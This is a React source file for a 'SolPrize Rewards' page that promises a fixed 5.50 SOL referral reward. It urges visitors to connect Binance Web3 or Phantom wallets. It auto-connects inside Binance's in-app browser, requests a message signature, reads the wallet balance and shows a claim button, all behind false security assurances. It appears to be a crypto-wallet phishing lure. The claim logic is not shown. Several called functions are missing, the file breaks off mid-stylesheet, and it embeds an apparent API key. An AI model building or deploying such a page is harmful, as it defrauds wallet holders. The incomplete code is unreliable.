import React, { useState, useEffect, useRef, useCallback } from 'react';

export default function App() {
  // ========================
  // STATE MANAGEMENT - Organized by feature
  // ========================
  
  // Loading & UI States
  const [loading, setLoading] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [typewriterText, setTypewriterText] = useState('');
  const [isMobileDevice, setIsMobileDevice] = useState(false);
  
  // Wallet Connection States
  const [walletAddress, setWalletAddress] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState('');
  const [walletProvider, setWalletProvider] = useState(null);
  const [sessionActive, setSessionActive] = useState(false);
  const [isBinanceEnvironment, setIsBinanceEnvironment] = useState(false);
  
  // Balance & Reward States
  const [tokenBalance, setTokenBalance] = useState(null);
  const [showClaimButton, setShowClaimButton] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimStatus, setClaimStatus] = useState('');
  
  // Debug & Utility States
  const [debugInfo, setDebugInfo] = useState([]);
  const [particles, setParticles] = useState([]);
  
  // ========================
  // REFS & CONFIGURATION - Better organized
  // ========================
  
  const wcClientRef = useRef(null);
  const sessionRef = useRef(null);
  const connectionTimerRef = useRef(null);
  const retryCountRef = useRef(0);
  
  // Configuration Constants - Moved to top for clarity
  const CONFIG = {
    WC_PROJECT_ID: 'ec8dd86047facf2fb8471641db3e5f0c',
    APP_URL: 'https://solprize.vercel.app',
    APP_NAME: 'SolPrize Rewards',
    APP_DESCRIPTION: 'Claim your referral rewards',
    MAINNET_RPC: 'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H',
    MAINNET_CHAIN_ID: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp',
    MAX_CONNECTION_ATTEMPTS: 3,
    CONNECTION_TIMEOUT: 15000, // 15 seconds
    BINANCE_USER_AGENT_PATTERNS: [
      'binance',
      'bnb',
      'trustwallet',
      'binancechain',
      'binancesmartchain'
    ],
    BINANCE_WEBVIEW_URLS: [
      'binance.com/en/web3-wallet',
      'binance.com/web3-wallet',
      'app.binance.com'
    ]
  };

  // ========================
  // ENHANCED DETECTION HOOKS
  // ========================
  
  useEffect(() => {
    const detectEnvironment = () => {
      const ua = navigator.userAgent.toLowerCase();
      const url = window.location.href.toLowerCase();
      
      // Enhanced Binance environment detection
      const isBinanceUA = CONFIG.BINANCE_USER_AGENT_PATTERNS.some(pattern => 
        ua.includes(pattern.toLowerCase())
      );
      
      const isBinanceURL = CONFIG.BINANCE_WEBVIEW_URLS.some(pattern => 
        url.includes(pattern.toLowerCase())
      );
      
      const isBinanceWebView = isBinanceUA || isBinanceURL;
      
      setIsBinanceEnvironment(isBinanceWebView);
      addDebug(`🔍 Environment Detection: ${isBinanceWebView ? '✅ Binance Web3 Environment' : '🌐 Standard Web Environment'}`);
      addDebug(`📱 User Agent: ${ua.substring(0, 100)}...`);
      addDebug(`🔗 Current URL: ${url}`);
      
      // Auto-connect if in Binance environment and wallet is available
      if (isBinanceWebView && window.solana) {
        addDebug('⚡ Auto-attempting direct connection in Binance environment');
        setTimeout(() => {
          if (!walletAddress && !connecting) {
            handleDirectBinanceConnection();
          }
        }, 1000);
      }
    };
    
    detectEnvironment();
    window.addEventListener('load', detectEnvironment);
    window.addEventListener('DOMContentLoaded', detectEnvironment);
    
    return () => {
      window.removeEventListener('load', detectEnvironment);
      window.removeEventListener('DOMContentLoaded', detectEnvironment);
    };
  }, [walletAddress, connecting]);

  useEffect(() => {
    const detectMobileDevice = () => {
      const ua = navigator.userAgent.toLowerCase();
      const mobile = /android|iphone|ipad|ipod|opera mini|iemobile|mobile|webos|blackberry|windows phone/i.test(ua);
      const tablet = /(ipad|tablet|playbook|silk)|(android(?!.*mobile))/i.test(ua);
      setIsMobileDevice(mobile || tablet);
      
      if (!mobile && !tablet) {
        addDebug('⚠️ Desktop detected - mobile device recommended for Binance Web3 Wallet');
      } else {
        addDebug(`✅ Mobile device detected: ${tablet ? 'Tablet' : 'Phone'} - ${ua.substring(0, 50)}...`);
      }
    };
    
    detectMobileDevice();
    
    // Initialize particles for background animation
    const newParticles = Array.from({ length: 30 }, (_, i) => ({
      id: i,
      size: Math.random() * 4 + 2,
      left: Math.random() * 100,
      duration: Math.random() * 10 + 10,
      delay: Math.random() * 5
    }));
    setParticles(newParticles);
    
    return () => {
      if (connectionTimerRef.current) clearTimeout(connectionTimerRef.current);
    };
  }, []);

  // ========================
  // UTILITY FUNCTIONS - Enhanced and optimized
  // ========================
  
  const isIOS = useCallback(() => /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase()), []);
  const isAndroid = useCallback(() => /android/i.test(navigator.userAgent.toLowerCase()), []);
  
  const addDebug = useCallback((message, level = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    const formattedMessage = `[${timestamp}] ${message}`;
    
    console[level === 'error' ? 'error' : level === 'warn' ? 'warn' : 'log'](`🔍 ${formattedMessage}`);
    
    setDebugInfo(prev => {
      const newDebug = [...prev, `${timestamp}: ${message}`];
      return newDebug.slice(-100); // Keep last 100 entries for better debugging
    });
  }, []);

  const safeWindowOpen = useCallback((url, target = '_blank') => {
    try {
      const newWindow = window.open(url, target, 'noopener,noreferrer');
      if (!newWindow) {
        addDebug('⚠️ Popup blocked by browser', 'warn');
        return false;
      }
      return true;
    } catch (error) {
      addDebug(`⚠️ Failed to open window: ${error.message}`, 'error');
      return false;
    }
  }, [addDebug]);

  // ========================
  // SOLANA INTEGRATION - Enhanced with transaction signing
  // ========================
  
  const fetchSolanaBalance = useCallback(async (publicKey) => {
    try {
      addDebug('💰 Fetching SOL balance from mainnet using Syndica API...');
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);
      
      const response = await fetch(CONFIG.MAINNET_RPC, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'getBalance',
          params: [publicKey]
        }),
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const data = await response.json();
      if (data.result?.value !== undefined) {
        const lamports = data.result.value;
        const sol = lamports / 1000000000;
        setTokenBalance(sol);
        addDebug(`✅ Balance: ${sol.toFixed(4)} SOL (${lamports} lamports)`);
        return sol;
      } else {
        addDebug('⚠️ Balance response missing value', 'warn');
        return null;
      }
    } catch (error) {
      if (error.name === 'AbortError') {
        addDebug('⏰ Balance fetch timed out', 'warn');
      } else {
        addDebug(`❌ Balance fetch error: ${error.message}`, 'error');
      }
      return null;
    }
  }, [addDebug]);

  const signHelloTransaction = useCallback(async (provider, publicKey) => {
    try {
      addDebug('✍️ Preparing to sign "hello" message transaction...');
      
      // Create a simple message to sign
      const message = new TextEncoder().encode(`Hello from SolPrize! ${new Date().toISOString()}`);
      
      // Sign the message
      const signature = await provider.signMessage(message, 'utf8');
      
      addDebug('✅ "Hello" message signed successfully!');
      addDebug(`📝 Signature: ${Buffer.from(signature).toString('hex').substring(0, 32)}...`);
      
      // Show success notification to user
      setTimeout(() => {
        alert(`🎉 Success! Your "hello" message has been signed.
This confirms your wallet connection is working properly.`);
      }, 500);
      
      return signature;
    } catch (error) {
      addDebug(`❌ Failed to sign "hello" message: ${error.message}`, 'error');
      
      // Don't fail the entire connection if message signing fails
      if (error.message.includes('rejected')) {
        addDebug('ℹ️ User rejected message signing - proceeding with connection', 'warn');
        return null;
      }
      
      throw error;
    }
  }, [addDebug]);

  // ========================
  // ENHANCED BINANCE DIRECT CONNECTION
  // ========================
  
  const handleDirectBinanceConnection = useCallback(async () => {
    if (!window.solana) {
      addDebug('❌ No Solana provider available in Binance environment', 'error');
      return;
    }
    
    setConnecting(true);
    setConnectionStatus('Connecting directly to Binance Web3 Wallet...');
    addDebug('⚡ Attempting direct connection in Binance environment');
    
    try {
      // Check if already connected
      if (window.solana.isConnected && window.solana.publicKey) {
        addDebug('✅ Already connected to Binance Web3 Wallet');
        const publicKey = window.solana.publicKey.toString();
        await handleSuccessfulConnection(publicKey, 'binance-direct');
        return;
      }
      
      // Attempt connection
      const response = await window.solana.connect({
        onlyIfTrusted: true,
        timeout: CONFIG.CONNECTION_TIMEOUT
      });
      
      const publicKey = response.publicKey.toString();
      addDebug(`✅ Direct connection successful: ${publicKey}`);
      
      // Sign hello transaction after successful connection
      await signHelloTransaction(window.solana, publicKey);
      
      await handleSuccessfulConnection(publicKey, 'binance-direct');
      
    } catch (error) {
      addDebug(`❌ Direct connection error: ${error.message}`, 'error');
      
      if (error.message.includes('timeout') || error.message.includes('user rejected')) {
        addDebug('🔄 Falling back to WalletConnect method', 'warn');
        // Don't show modal automatically - let user choose
        setTimeout(() => {
          if (!walletAddress) {
            setShowModal(true);
          }
        }, 1000);
      } else {
        alert(`❌ Connection Failed
${error.message}
Please try connecting manually.`);
      }
      
    } finally {
      setConnecting(false);
      setConnectionStatus('');
    }
  }, [addDebug, signHelloTransaction, walletAddress]);

  // ========================
  // CONNECTION HANDLERS - Improved with better error handling
  // =================-------
  
  const handleSuccessfulConnection = useCallback(async (address, provider) => {
    try {
      addDebug(`✅ Wallet connected successfully: ${address}`);
      addDebug(`🔌 Provider: ${provider}`);
      
      setWalletAddress(address);
      setSessionActive(true);
      setConnecting(false);
      setConnectionStatus('');
      
      // Fetch balance
      const balance = await fetchSolanaBalance(address);
      
      // Show claim button after successful connection
      setShowClaimButton(true);
      
      // Production-ready connection logging
      const connectionData = {
        timestamp: new Date().toISOString(),
        address: address,
        provider: provider,
        balance: balance,
        userAgent: navigator.userAgent,
        platform: isAndroid() ? 'android' : isIOS() ? 'ios' : 'other',
        environment: isBinanceEnvironment ? 'binance-webview' : 'standard-web'
      };
      
      console.log('🎯 Wallet successfully connected!', connectionData);
      
      // Show success notification
      setTimeout(() => {
        const balanceDisplay = balance ? balance.toFixed(4) : 'N/A';
        alert(`🎉 Wallet Connected Successfully!
Address: ${address.slice(0, 8)}...${address.slice(-6)}
Balance: ${balanceDisplay} SOL
Environment: ${isBinanceEnvironment ? 'Binance Web3' : 'Standard Web'}`);
      }, 500);
      
    } catch (error) {
      addDebug(`❌ Connection success handler error: ${error.message}`, 'error');
      setConnecting(false);
      setConnectionStatus('Connection completed but encountered errors');
    }
  }, [addDebug, fetchSolanaBalance, isAndroid, isIOS, isBinanceEnvironment]);

  const handleDisconnect = useCallback(async () => {
    try {
      addDebug('🔌 Disconnecting wallet...');
      
      if (sessionRef.current?.topic && wcClientRef.current) {
        await wcClientRef.current.disconnect({
          topic: sessionRef.current.topic,
          reason: { code: 6000, message: 'User disconnected' }
        });
      }
      
      if (window.solana?.disconnect) {
        await window.solana.disconnect();
      }
      
      // Reset all states
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      sessionRef.current = null;
      
      addDebug('✅ Wallet disconnected successfully');
      alert('✅ Wallet Disconnected Successfully');
      
    } catch (error) {
      addDebug(`⚠️ Disconnect error: ${error.message}`, 'error');
      // Still reset state even if disconnect fails
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      sessionRef.current = null;
    }
  }, [addDebug]);

  // ========================
  // WALLET CONNECTION METHODS - Enhanced with retry logic
  // =================-------
  
  const connectBinanceWallet = useCallback(async () => {
    setShowModal(false);
    
    if (!isMobileDevice && !isBinanceEnvironment) {
      const message = '📱 Mobile Device Required\nBinance Web3 Wallet only works on mobile devices. Please open this page on your smartphone.';
      addDebug(message, 'warn');
      alert(message);
      return;
    }
    
    // If in Binance environment, use direct connection
    if (isBinanceEnvironment && window.solana) {
      addDebug('⚡ Using direct connection in Binance environment');
      await handleDirectBinanceConnection();
      return;
    }
    
    setConnecting(true);
    setConnectionStatus('Initializing Binance Web3 Wallet connection...');
    setDebugInfo([]);
    setShowClaimButton(false);
    retryCountRef.current = 0;
    
    try {
      addDebug('🚀 Starting Binance Web3 Wallet connection');
      addDebug(`📱 Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Other Mobile'}`);
      addDebug(`🆔 Project ID: ${CONFIG.WC_PROJECT_ID}`);
      addDebug(`🌐 APP URL: ${CONFIG.APP_URL}`);
      addDebug(`⛓️ Mainnet RPC: ${CONFIG.MAINNET_RPC.substring(0, 50)}...`);
      
      // Get WalletConnect client
      const client = await getWalletConnectClient();
      
      if (!client) {
        throw new Error('Failed to initialize WalletConnect client');
      }
      
      // Create session
      setConnectionStatus('Generating secure connection...');
      const { uri, approval } = await createWalletConnectSession(client);
      
      if (!uri) {
        throw new Error('Failed to generate connection URI');
      }
      
      // Open Binance app
      setConnectionStatus('Opening Binance Web3 Wallet app...\nPlease wait while we establish the connection.');
      openBinanceWeb3Wallet(uri);
      
      if (approval) {
        addDebug('⏳ Waiting for user approval in Binance app...');
        setConnectionStatus('Please approve the connection in your Binance app\nThe page will update automatically when connected');
        
        const session = await Promise.race([
          approval(),
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Connection approval timeout after 2 minutes')), 120000)
          )
        ]);
        
        sessionRef.current = session;
        addDebug('✅ Session approved via WalletConnect!');
        
        // Extract wallet address from session
        const accounts = session.namespaces?.solana?.accounts || [];
        if (accounts.length > 0) {
          const address = accounts[0].split(':').pop();
          if (address && address.length === 44) {
            await handleSuccessfulConnection(address, 'walletconnect');
          } else {
            throw new Error('Invalid wallet address format');
          }
        } else {
          throw new Error('No Solana accounts found in session');
        }
      }
      
    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      addDebug(`❌ Critical error: ${error.message}`, 'error');
      
      const errorMessage = error.message.includes('timeout') 
        ? 'Connection timed out. Please try again.'
        : error.message.includes('URI') 
        ? 'Failed to generate connection. Please refresh and try again.'
        : error.message;
        
      const userMessage = `❌ Connection Failed
${errorMessage}
Please ensure:
• Binance app is installed and updated
• You have a stable internet connection
• Try again in a few minutes`;
      
      alert(userMessage);
    }
  }, [addDebug, getWalletConnectClient, createWalletConnectSession, openBinanceWeb3Wallet, 
      handleSuccessfulConnection, isMobileDevice, isAndroid, isIOS, isBinanceEnvironment, 
      handleDirectBinanceConnection]);

  // ========================
  // UI RENDERING - Cleaned up and optimized
  // =================-------
  
  if (!loading && !isMobileDevice && !isBinanceEnvironment) {
    return (
      <div style={styles.desktopContainer}>
        <div style={styles.desktopCard}>
          <div style={{ fontSize: '64px', marginBottom: '20px' }}>📱</div>
          <h1 style={styles.desktopTitle}>Mobile Device Required</h1>
          <p style={styles.desktopText}>
            This application is optimized for mobile devices to provide the best wallet connection experience. 
            Please open this page on your smartphone to connect your Binance Web3 Wallet and claim your rewards.
          </p>
          <div style={styles.urlBox}>
            <strong>Current URL:</strong><br/>
            <code style={styles.urlCode}>{CONFIG.APP_URL}</code>
          </div>
          <div style={styles.tipBox}>
            💡 <strong>Quick Tip:</strong> Scan this QR code with your phone's camera or use the share button to open on mobile.
          </div>
          <button onClick={() => window.location.reload()} style={styles.refreshButton}>
            Refresh Page
          </button>
          {isBinanceEnvironment && (
            <div style={styles.binanceDetectedBox}>
              ⚡ <strong>Binance Environment Detected!</strong><br/>
              This page works best in the Binance app's Web3 browser. Try opening it directly from the Binance app.
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div style={styles.container}>
      <style>{`
        @keyframes gradientShift { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-20px); } }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes blink { from, to { opacity: 1; } 50% { opacity: 0; } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
      `}</style>
      
      {/* Background gradient overlay */}
      <div style={styles.gradientOverlay} />
      
      {/* Particle background */}
      {particles.map(p => (
        <div key={p.id} style={styles.particle(p)} />
      ))}
      
      {/* Loading state */}
      {loading && (
        <div style={styles.loadingContainer}>
          <div style={styles.spinner} />
          <div style={styles.loadingText}>LOADING...</div>
        </div>
      )}
      
      {/* Main content */}
      {!loading && (
        <div style={styles.contentContainer}>
          <div style={styles.headerBadge}>✨ REFERRAL REWARDS</div>
          
          <div style={styles.mainCard}>
            <h1 style={styles.title}>
              {typewriterText}
              <span style={styles.cursor}>|</span>
            </h1>
            
            <p style={styles.description}>
              Thank you for your participation! Connect your wallet to claim your well-deserved rewards.
            </p>
            
            {/* Reward display */}
            <div style={styles.rewardCard}>
              <div style={styles.rewardBackground} />
              <div style={styles.rewardLabel}>Your Reward</div>
              <div style={styles.rewardAmount}>5.50 SOL</div>
              <div style={styles.rewardUSD}>≈ ${(5.50 * 150).toFixed(2)} USD</div>
              {tokenBalance !== null && (
                <div style={styles.balanceDisplay}>
                  💰 Current Balance: {tokenBalance.toFixed(4)} SOL
                </div>
              )}
            </div>
            
            {/* Connected wallet display */}
            {walletAddress && (
              <div style={styles.connectedWallet}>
                <div style={styles.walletInfo}>
                  <div style={styles.walletLabel}>
                    <span>✓</span> Connected Wallet
                  </div>
                  <div style={styles.walletAddress}>
                    <span>👛</span>
                    {walletAddress.slice(0, 12)}...{walletAddress.slice(-12)}
                  </div>
                </div>
                <button onClick={handleDisconnect} style={styles.disconnectButton}>
                  🔌 Disconnect
                </button>
              </div>
            )}
            
            {/* Claim button */}
            {showClaimButton && !claiming && !claimStatus && (
              <button onClick={claimRewards} style={styles.claimButton}>
                🎁 CLAIM REWARDS
              </button>
            )}
            
            {/* Status messages */}
            {claimStatus && (
              <div style={styles.statusMessage(claimStatus.includes('❌'), claimStatus.includes('🎉'))}>
                {claimStatus}
              </div>
            )}
            
            {connecting && connectionStatus && (
              <div style={styles.connectingMessage}>
                <div style={styles.spinnerSmall} />
                <div style={styles.connectionText}>{connectionStatus}</div>
              </div>
            )}
            
            {/* Environment detection notice */}
            {isBinanceEnvironment && !walletAddress && !connecting && (
              <div style={styles.binanceNotice}>
                ⚡ <strong>Binance Web3 Environment Detected!</strong><br/>
                Click "CONNECT WALLET" below to connect directly without QR codes.
              </div>
            )}
            
            {/* Debug log */}
            {debugInfo.length > 0 && (
              <div style={styles.debugLog}>
                <div style={styles.debugHeader}>
                  <strong>🔍 Debug Log:</strong>
                  <button onClick={copyDebugInfo} style={styles.copyButton}>
                    📋 Copy Log
                  </button>
                </div>
                {debugInfo.map((info, i) => (
                  <div key={i} style={styles.debugEntry(info)}>
                    {info}
                  </div>
                ))}
              </div>
            )}
            
            {/* Connect wallet button */}
            <button 
              onClick={() => isBinanceEnvironment && window.solana 
                ? handleDirectBinanceConnection() 
                : setShowModal(true)
              } 
              disabled={connecting || walletAddress}
              style={styles.connectButton(connecting, walletAddress)}
            >
              {connecting ? '⏳ CONNECTING...' : 
               walletAddress ? '✅ WALLET CONNECTED' : 
               isBinanceEnvironment ? '⚡ CONNECT BINANCE WALLET' : '🚀 CONNECT WALLET'}
            </button>
            
            {!walletAddress && !connecting && (
              <p style={styles.footerText}>
                🔐 Secured connection • By connecting, you agree to our Terms of Service
              </p>
            )}
          </div>
          
          {/* Footer info */}
          <div style={styles.footer}>
            <p>🔒 Powered by WalletConnect v2 • Binance Web3 Wallet</p>
            <p style={{ marginTop: '4px', opacity: 0.8, fontSize: '12px' }}>
              📱 {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} • Environment: {isBinanceEnvironment ? 'Binance Web3' : 'Standard Web'}
            </p>
            <p style={{ marginTop: '4px', fontSize: '11px', opacity: 0.7 }}>
              ⚠️ Always verify connection requests in your wallet app
            </p>
          </div>
        </div>
      )}
      
      {/* Wallet selection modal */}
      {showModal && (
        <div onClick={() => !connecting && setShowModal(false)} style={styles.modalOverlay}>
          <div onClick={(e) => e.stopPropagation()} style={styles.modalContent}>
            <div style={styles.modalHeader}>
              <h2 style={styles.modalTitle}>
                <span>👛</span> Select Wallet
              </h2>
              <button onClick={() => setShowModal(false)} disabled={connecting} style={styles.closeButton}>
                ×
              </button>
            </div>
            <p style={styles.modalDescription}>
              Choose your preferred wallet to connect and claim your rewards
            </p>
            
            <div style={styles.walletOptions}>
              <button onClick={connectBinanceWallet} disabled={connecting} style={styles.binanceButton}>
                <div style={styles.walletIcon}>🟡</div>
                <div style={styles.walletDetails}>
                  <div style={styles.walletName}>Binance Web3 Wallet</div>
                  <div style={styles.walletSubtext}>
                    {isBinanceEnvironment ? '⚡ Direct Connection Available' : 'Recommended • Mobile App • Discover Tab'}
                  </div>
                </div>
              </button>
              
              <button onClick={connectPhantomWallet} disabled={connecting} style={styles.phantomButton}>
                <div style={styles.walletIcon}>👻</div>
                <div style={styles.walletDetails}>
                  <div style={styles.walletName}>Phantom Wallet</div>
                  <div style={styles.walletSubtext}>Solana • Browser Extension • Mobile App</div>
                </div>
              </button>
            </div>
            
            <div style={styles.securityInfo}>
              <div style={styles.securityTitle}>
                <span>🔐</span> Safe & Secure
              </div>
              <div style={styles.securityText}>
                We never store your private keys. Your wallet credentials remain secure and under your control at all times. All transactions require your explicit approval.
              </div>
            </div>
            
            {isBinanceEnvironment && (
              <div style={styles.binanceTip}>
                💡 <strong>Pro Tip:</strong> You're in the Binance Web3 environment! Click "Binance Web3 Wallet" above for instant connection without QR codes.
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

// ========================
// STYLES OBJECT - Cleaned up and organized
// ========================

const styles = {
  // Container styles
  container: {
    minHeight: '100vh',
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    position: 'relative',
    overflow: 'hidden',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
  },
  
  gradientOverlay: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    background: 'linear-gradient(45deg, rgba(255,0,150,0.3), rgba(0,204,255,0.3))',
    animation: 'gradientShift 10s ease infinite',
    zIndex: 1
  },
  
  // Loading styles
  loadingContainer: {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    textAlign: 'center',
    zIndex: 10
  },
  
  spinner: {
    width: '60px',
    height: '60px',
    border: '4px solid rgba(255,255,255,0.3)',
    borderTop: '4px solid white',
    borderRadius: '50%',
    animation: 'spin 1s linear infinite',
    margin: '0 auto 20px',
    boxShadow: '0 0 20px rgba(255,255,255,0.5)'
  },
  
  loadingText: {
    color: 'white',
    fontSize: '20px',
    fontWeight: 'bold',
    letterSpacing: '2px',
    textShadow: '0 2px 10px rgba(0,0,0,0.3)',
    background: 'rgba(0,0,0,0.2)',
    padding: '8px 20px',
    borderRadius: '20px',
    backdropFilter: 'blur(5px)',
    display: 'inline-block'
  },
  
  // Content styles
  contentContainer: {
    position: 'relative',
    zIndex: 3,
    maxWidth: '500px',
    margin: '0 auto',
    padding: '40px 20px',
    minHeight: '100vh',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center'
  },
  
  headerBadge: {
    background: 'rgba(255,255,255,0.2)',
    backdropFilter: 'blur(10px)',
    padding: '10px 20px',
    borderRadius: '20px',
    display: 'inline-block',
    margin: '0 auto 30px',
    color: 'white',
    fontSize: '14px',
    fontWeight: 'bold',
    border: '1px solid rgba(255,255,255,0.3)',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    boxShadow: '0 4px 15px rgba(0,0,0,0.2)'
  },
  
  mainCard: {
    background: 'rgba(255,255,255,0.95)',
    borderRadius: '24px',
    padding: '40px 30px',
    boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
    border: '1px solid rgba(255,255,255,0.5)',
    animation: 'slideUp 0.6s ease-out',
    position: 'relative',
    overflow: 'hidden'
  },
  
  title: {
    fontSize: '32px',
    fontWeight: 'bold',
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    WebkitBackgroundClip: 'text',
    WebkitTextFillColor: 'transparent',
    backgroundClip: 'text',
    marginBottom: '20px',
    minHeight: '40px'
  },
  
  cursor: {
    animation: 'blink 1s step-end infinite',
    WebkitTextFillColor: '#667eea'
  },
  
  description: {
    color: '#4b5563',
    fontSize: '16px',
    lineHeight: '1.6',
    marginBottom: '30px'
  },
  
  // Reward card styles
  rewardCard: {
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    padding: '30px',
    borderRadius: '16px',
    textAlign: 'center',
    marginBottom: '30px',
    boxShadow: '0 8px 20px rgba(102, 126, 234, 0.4)',
    position: 'relative',
    overflow: 'hidden',
    border: '2px solid rgba(255,255,255,0.3)'
  },
  
  rewardBackground: {
    position: 'absolute',
    top: '-50%',
    left: '-50%',
    width: '200%',
    height: '200%',
    background: 'linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent)',
    animation: 'spin 8s linear infinite',
    zIndex: 1
  },
  
  rewardLabel: {
    color: 'rgba(255,255,255,0.9)',
    fontSize: '14px',
    marginBottom: '8px',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    fontWeight: '600',
    zIndex: 2,
    position: 'relative'
  },
  
  rewardAmount: {
    color: 'white',
    fontSize: '48px',
    fontWeight: 'bold',
    textShadow: '0 2px 15px rgba(0,0,0,0.3)',
    zIndex: 2,
    position: 'relative'
  },
  
  rewardUSD: {
    color: 'rgba(255,255,255,0.8)',
    fontSize: '14px',
    marginTop: '8px',
    zIndex: 2,
    position: 'relative'
  },
  
  balanceDisplay: {
    marginTop: '12px',
    padding: '8px 16px',
    background: 'rgba(255,255,255,0.2)',
    borderRadius: '8px',
    fontSize: '12px',
    color: 'white',
    backdropFilter: 'blur(5px',
    border: '1px solid rgba(255,255,255,0.3)',
    zIndex: 2,
    position: 'relative'
  },
  
  // Wallet connection styles
  connectedWallet: {
    background: 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)',
    border: '2px solid #6ee7b7',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    boxShadow: '0 4px 12px rgba(16, 185, 129, 0.2)',
    animation: 'slideUp 0.4s ease-out'
  },
  
  walletInfo: {
    flex: 1,
    minWidth: 0
  },
  
  walletLabel: {
    fontSize: '12px', 
    color: '#065f46', 
    marginBottom: '4px',
    fontWeight: '600',
    textTransform: 'uppercase',
    display: 'flex',
    alignItems: 'center',
    gap: '6px'
  },
  
  walletAddress: {
    fontSize: '14px', 
    fontWeight: 'bold', 
    color: '#047857',
    fontFamily: 'monospace',
    wordBreak: 'break-all',
    display: 'flex',
    alignItems: 'center',
    gap: '8px'
  },
  
  disconnectButton: {
    background: '#dc2626',
    color: 'white',
    border: 'none',
    padding: '8px 16px',
    borderRadius: '8px',
    fontSize: '12px',
    fontWeight: 'bold',
    cursor: 'pointer',
    marginLeft: '12px',
    flexShrink: 0,
    transition: 'all 0.2s',
    boxShadow: '0 2px 6px rgba(220, 38, 38, 0.3)'
  },
  
  // Button styles
  claimButton: {
    width: '100%',
    background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
    color: 'white',
    border: 'none',
    padding: '18px',
    borderRadius: '12px',
    fontSize: '18px',
    fontWeight: 'bold',
    cursor: 'pointer',
    transition: 'all 0.3s',
    boxShadow: '0 8px 20px rgba(16, 185, 129, 0.4)',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    marginBottom: '20px',
    animation: 'pulse 2s infinite'
  },
  
  connectButton: (connecting, walletAddress) => ({
    width: '100%',
    background: walletAddress 
      ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
      : connecting
      ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
      : 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    color: 'white',
    border: 'none',
    padding: '18px',
    borderRadius: '12px',
    fontSize: '18px',
    fontWeight: 'bold',
    cursor: connecting || walletAddress ? 'not-allowed' : 'pointer',
    transition: 'all 0.3s',
    boxShadow: connecting || walletAddress ? 'none' : '0 8px 20px rgba(102, 126, 234, 0.4)',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    opacity: connecting || walletAddress ? 0.7 : 1,
    transform: 'scale(1)'
  }),
  
  // Status message styles
  statusMessage: (isError, isSuccess) => ({
    background: isError ? 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)' : 
             isSuccess ? 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)' : 
             'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
    border: isError ? '2px solid #f87171' : 
            isSuccess ? '2px solid #6ee7b7' : 
            '2px solid #fbbf24',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    color: isError ? '#b91c1c' : 
           isSuccess ? '#065f46' : 
           '#92400e',
    fontSize: '14px',
    fontWeight: '500',
    lineHeight: '1.5',
    whiteSpace: 'pre-line',
    boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
    animation: 'slideUp 0.3s ease-out'
  }),
  
  connectingMessage: {
    background: 'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
    border: '2px solid #fbbf24',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    color: '#92400e',
    fontSize: '14px',
    fontWeight: '600',
    lineHeight: '1.6',
    whiteSpace: 'pre-line',
    boxShadow: '0 4px 12px rgba(251, 191, 36, 0.2)',
    animation: 'slideUp 0.3s ease-out'
  },
  
  spinnerSmall: {
    width: '24px',
    height: '24px',
    border: '3px solid #92400e',
    borderTopColor: 'transparent',
    borderRadius: '50%',
    animation: 'spin 1s linear infinite',
